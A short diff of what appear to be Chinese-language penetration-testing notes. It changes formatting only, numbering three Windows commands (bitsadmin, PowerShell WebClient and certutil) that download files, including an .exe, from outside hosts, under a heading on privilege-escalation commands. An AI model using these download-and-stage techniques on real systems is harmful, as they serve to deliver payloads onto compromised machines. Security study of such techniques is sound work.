@@ -33,9 +33,9 @@ downloader常用方法如下：
 ·  ftp
 ·  ftfp
 
-bitsadmin /rawreturn /transfer getfile http://202.1.1.1/1.php.txt D:\1.txt
-powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://4.5.1.1/a.exe', '2.exe')"
-certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt
+ 1. bitsadmin /rawreturn /transfer getfile http://202.1.1.1/1.php.txt D:\1.txt
+ 2. powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://4.5.1.1/a.exe', '2.exe')"
+ 3. certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt
 
 cmd 提权常用命令
 
